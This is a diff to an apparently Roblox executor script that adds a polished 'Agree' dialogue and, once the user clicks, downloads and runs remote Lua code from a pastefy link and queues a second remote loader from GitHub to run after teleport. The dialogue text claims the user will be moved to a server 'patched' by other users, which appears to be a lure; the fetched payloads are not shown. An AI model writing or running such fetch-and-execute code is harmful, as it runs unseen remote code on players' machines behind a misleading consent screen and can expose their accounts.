@@ -55,7 +55,7 @@ loadingBar.Parent = loadingFrame
 local fadeInTween = TweenService:Create(
     background,
     TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
-    {BackgroundTransparency = 0.85}
+    {BackgroundTransparency = 0.1}
 )
 
 local titleFadeIn = TweenService:Create(
@@ -155,4 +155,133 @@ loadingTween.Completed:Connect(function()
         messageLabel.Size = UDim2.new(1, -40, 0, 180)
         messageLabel.Position = UDim2.new(0, 20, 0, 70)
         messageLabel.BackgroundTransparency = 1
-        messageLabel.Text = "Hereby will need your agreement to properly use of my script and must not be used for bad intentions and any other ill motives. The script also need you to be in a good server where it will work at best, do not worry you will be automatically joined to a server with the best server version and that is already patched by me or other users that uses this script. If you agreed of the use and its concepts please proceed to click the button
+        messageLabel.Text = "Hereby will need your agreement to properly use of my script and must not be used for bad intentions and any other ill motives. The script also need you to be in a good server where it will work at best, do not worry you will be automatically joined to a server with the best server version and that is already patched by me or other users that uses this script. If you agreed of the use and its concepts please proceed to click the button below."
+        messageLabel.TextColor3 = Color3.new(0.9, 0.9, 0.9)
+        messageLabel.TextTransparency = 1
+        messageLabel.TextSize = 14
+        messageLabel.TextWrapped = true
+        messageLabel.TextXAlignment = Enum.TextXAlignment.Left
+        messageLabel.TextYAlignment = Enum.TextYAlignment.Top
+        messageLabel.Font = Enum.Font.RobotoMono
+        messageLabel.Parent = dialogueBox
+        
+        local agreeButton = Instance.new("TextButton")
+        agreeButton.Size = UDim2.new(0, 120, 0, 35)
+        agreeButton.Position = UDim2.new(0.5, -60, 1, -55)
+        agreeButton.BackgroundColor3 = Color3.new(1, 1, 1)
+        agreeButton.BackgroundTransparency = 1
+        agreeButton.BorderSizePixel = 2
+        agreeButton.BorderColor3 = Color3.new(1, 1, 1)
+        agreeButton.Text = "Agree"
+        agreeButton.TextColor3 = Color3.new(1, 1, 1)
+        agreeButton.TextTransparency = 1
+        agreeButton.TextSize = 16
+        agreeButton.Font = Enum.Font.RobotoMono
+        agreeButton.Parent = dialogueBox
+        
+        local dialogueFadeIn = TweenService:Create(
+            dialogueBox,
+            TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
+            {BackgroundTransparency = 0.05}
+        )
+        
+        local titleFadeIn = TweenService:Create(
+            titleLabel,
+            TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
+            {TextTransparency = 0}
+        )
+        
+        local messageFadeIn = TweenService:Create(
+            messageLabel,
+            TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
+            {TextTransparency = 0}
+        )
+        
+        local buttonFadeIn = TweenService:Create(
+            agreeButton,
+            TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
+            {TextTransparency = 0, BackgroundTransparency = 0.9}
+        )
+        
+        dialogueFadeIn:Play()
+        titleFadeIn:Play()
+        messageFadeIn:Play()
+        buttonFadeIn:Play()
+        
+        local buttonClicked = false
+        
+        agreeButton.MouseEnter:Connect(function()
+            if not buttonClicked then
+                TweenService:Create(
+                    agreeButton,
+                    TweenInfo.new(0.2, Enum.EasingStyle.Quad),
+                    {BackgroundTransparency = 0.7, TextColor3 = Color3.new(0, 0, 0)}
+                ):Play()
+            end
+        end)
+        
+        agreeButton.MouseLeave:Connect(function()
+            if not buttonClicked then
+                TweenService:Create(
+                    agreeButton,
+                    TweenInfo.new(0.2, Enum.EasingStyle.Quad),
+                    {BackgroundTransparency = 0.9, TextColor3 = Color3.new(1, 1, 1)}
+                ):Play()
+            end
+        end)
+        
+        agreeButton.MouseButton1Click:Connect(function()
+            if not buttonClicked then
+                buttonClicked = true
+                agreeButton.Text = "Agreed"
+                TweenService:Create(
+                    agreeButton,
+                    TweenInfo.new(0.3, Enum.EasingStyle.Back),
+                    {BackgroundTransparency = 0.5, TextColor3 = Color3.new(0, 0, 0)}
+                ):Play()
+                
+                wait(1)
+                
+                local fadeOutTween = TweenService:Create(
+                    dialogueBox,
+                    TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.In),
+                    {BackgroundTransparency = 1}
+                )
+                
+                local titleFadeOut = TweenService:Create(
+                    titleLabel,
+                    TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.In),
+                    {TextTransparency = 1}
+                )
+                
+                local messageFadeOut = TweenService:Create(
+                    messageLabel,
+                    TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.In),
+                    {TextTransparency = 1}
+                )
+                
+                local buttonFadeOut = TweenService:Create(
+                    agreeButton,
+                    TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.In),
+                    {TextTransparency = 1, BackgroundTransparency = 1}
+                )
+                
+                fadeOutTween:Play()
+                titleFadeOut:Play()
+                messageFadeOut:Play()
+                buttonFadeOut:Play()
+                
+                fadeOutTween.Completed:Connect(function()
+                    dialogueGui:Destroy()
+                        loadstring(game:HttpGet("https://pastefy.app/kU8PNLf1/raw"))()
+                        queue_on_teleport([[
+                            wait(2)
+                            loadstring(game:HttpGet("https://raw.githubusercontent.com/laplacefr/roblox/refs/heads/main/visuals/load.lua"))()
+                        ]])
+                end)
+            end
+        end)
+    end)
+end)
+
+end)
